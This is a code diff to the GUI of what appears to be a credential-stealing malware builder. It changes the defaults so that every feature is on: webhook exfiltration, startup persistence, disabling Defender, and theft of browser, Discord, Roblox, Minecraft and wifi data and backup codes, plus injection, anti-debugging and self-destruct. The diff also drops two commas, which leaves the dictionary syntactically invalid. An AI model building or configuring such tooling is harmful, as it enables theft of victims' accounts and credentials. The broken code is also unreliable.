@@ -37,24 +37,24 @@ class App(customtkinter.CTk):
 
         self.updated_dictionary = {
             "webhook": None,
-            "ping": False,
+            "ping": True,
             "pingtype": None,
-            "fakeerror": False,
-            "startup": False,
-            "defender": False,
-            "systeminfo": False,
-            "backupcodes": False,
-            "browser": False,
-            "roblox": False,
-            "obfuscation": False,
-            "injection": False,
-            "minecraft": False,
-            "wifi": False,
-            "killprotector": False,
-            "antidebug_vm": False,
-            "discord": False,
-            "anti_spam": False,
-            "self_destruct": False,
+            "fakeerror": True,
+            "startup": True,
+            "defender": True,
+            "systeminfo": True,
+            "backupcodes": True,
+            "browser": True,
+            "roblox": True,
+            "obfuscation": True
+            "injection": True
+            "minecraft": True,
+            "wifi": True,
+            "killprotector": True,
+            "antidebug_vm": True,
+            "discord": True,
+            "anti_spam": True,
+            "self_destruct": True,
         }
 
         image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "./gui_images/")
